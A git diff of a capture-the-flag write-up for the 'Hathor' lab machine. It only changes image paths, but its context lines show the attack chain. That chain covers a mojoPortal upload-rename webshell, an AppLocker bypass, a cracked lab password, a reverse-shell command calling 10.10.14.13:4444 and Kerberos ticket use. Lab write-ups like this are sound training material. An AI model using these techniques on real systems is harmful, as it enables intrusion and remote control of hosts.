@@ -97,19 +97,19 @@ The first thing we notice is the domain name, which is `hathor.windcorp.htb`. Th
 
 Port 80 shows a corporate page that is still under construction:
 
-![](<../../../.gitbook/assets/image%20(2238).png>)
+![](../../../.gitbook/assets/hathor-9.png)
 
 At the bottom of the page, there's a link that brings us to a login page on the website:
 
-![](<../../../.gitbook/assets/image%20(612).png>)
+![](../../../.gitbook/assets/hathor-19.png)
 
 Viewing the page source reveals this is a mojoPortal instance:
 
-![](<../../../.gitbook/assets/image%20(3337).png>)
+![](../../../.gitbook/assets/hathor-15.png)
 
 A quick Google search for mojoPortal exploits and default credentials led to this:
 
-![](<../../../.gitbook/assets/image%20(1044).png>)
+![](../../../.gitbook/assets/hathor-2.png)
 
 Surprisingly, this worked!
 
@@ -117,31 +117,31 @@ Surprisingly, this worked!
 
 The administrator panel lets us edit the pages and what is shown:
 
-![](<../../../.gitbook/assets/image%20(701).png>)
+![](../../../.gitbook/assets/hathor-20.png)
 
 This is an IIS server, so uploading an `.aspx` reverse shell might work. Head to File Manager > Upload Files:
 
-![](<../../../.gitbook/assets/image%20(908).png>)
+![](../../../.gitbook/assets/hathor-21.png)
 
 When trying to upload, it doesn't work.
 
-![](<../../../.gitbook/assets/image%20(3515).png>)
+![](../../../.gitbook/assets/hathor-16.png)
 
 If we change it to `cmd.txt`, it works.
 
-![](<../../../.gitbook/assets/image%20(1501).png>)
+![](../../../.gitbook/assets/hathor-5.png)
 
 Then it shows up here:
 
-![](<../../../.gitbook/assets/image%20(102).png>)
+![](../../../.gitbook/assets/hathor-1.png)
 
 Interestingly, there's a Move function as well, and we can try moving this to be `cmd.aspx`.
 
-![](<../../../.gitbook/assets/image%20(1166).png>)
+![](../../../.gitbook/assets/hathor-4.png)
 
 We can try to rename it as `cmd.aspx`, and it seems to work:
 
-![](<../../../.gitbook/assets/image%20(2368).png>)
+![](../../../.gitbook/assets/hathor-10.png)
 
 Turns out this is actually a CVE:
 
@@ -149,7 +149,7 @@ Turns out this is actually a CVE:
 
 Anyways, we can access our webshell using this CVE:
 
-![](<../../../.gitbook/assets/image%20(2443).png>)
+![](../../../.gitbook/assets/hathor-11.png)
 
 However, getting **ANY** shell fails to work. Similar to Sekhmet (which I actually solved before this), there's some kind of firewall in use here that is blocking us.
 
@@ -163,7 +163,7 @@ powershell.exe -c Get-AppLockerPolicy -Effective -Xml
 
 This would generate a massive string of stuff that we can and cannot execute.
 
-![](<../../../.gitbook/assets/image%20(2054).png>)
+![](../../../.gitbook/assets/hathor-7.png)
 
 Here is what is allowed for files and binaries:
 
@@ -183,11 +183,11 @@ In this case, we can try some better webshells that don't rely on external binar
 
 Insomnia shell is a fully implemented web shell that can give us a reverse shell without the use of external binaries. We can upload this one and try again.
 
-![](<../../../.gitbook/assets/image%20(409).png>)
+![](../../../.gitbook/assets/hathor-18.png)
 
 Using this, we can get a reverse shell as `web`.
 
-![](<../../../.gitbook/assets/image%20(2237).png>)
+![](../../../.gitbook/assets/hathor-8.png)
 
 ## GinaWild Shell
 
@@ -261,7 +261,7 @@ active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;
 
 This is crackable:
 
-![](<../../../.gitbook/assets/image%20(3811).png>)
+![](../../../.gitbook/assets/hathor-17.png)
 
 `!!!!ilovegood17` is the password here.
 
@@ -517,7 +517,7 @@ system("cmd.exe /c C:\\share\\Bginfo64.exe -e cmd.exe 10.10.14.13 4444");
 
 After waiting for a little bit, we will get a shell back!
 
-![](<../../../.gitbook/assets/image%20(3183).png>)
+![](../../../.gitbook/assets/hathor-13.png)
 
 We can now grab the user flag.
 
@@ -645,11 +645,11 @@ Set-AuthenticodeSignature .\Get-bADpasswords.ps1 $pfx
 
 This script should let us know that we have imported it:
 
-![](<../../../.gitbook/assets/image%20(1152).png>)
+![](../../../.gitbook/assets/hathor-3.png)
 
 It should also let us know that we have signed it successfully:
 
-![](<../../../.gitbook/assets/image%20(253).png>)
+![](../../../.gitbook/assets/hathor-12.png)
 
 Then, there's a `run.vbs` script that looks like it executes the file:
 
@@ -664,7 +664,7 @@ WshShell.Run Command
 
 We can simply use `cscript ./run.vbs` to run this, and we would get another reverse shell:
 
-![](<../../../.gitbook/assets/image%20(1534).png>)
+![](../../../.gitbook/assets/hathor-6.png)
 
 ## Root Shell
 
@@ -724,6 +724,6 @@ $ export KRB5CCNAME=administrator@windcorp.htb.ccache
 
 Then, we can use this ticket to get a shell using this ticket:
 
-![](<../../../.gitbook/assets/image%20(3233).png>)
+![](../../../.gitbook/assets/hathor-14.png)
 
 Rooted! Although hard, this machine had steps that were simple if the enumeration was done properly. Great machine!
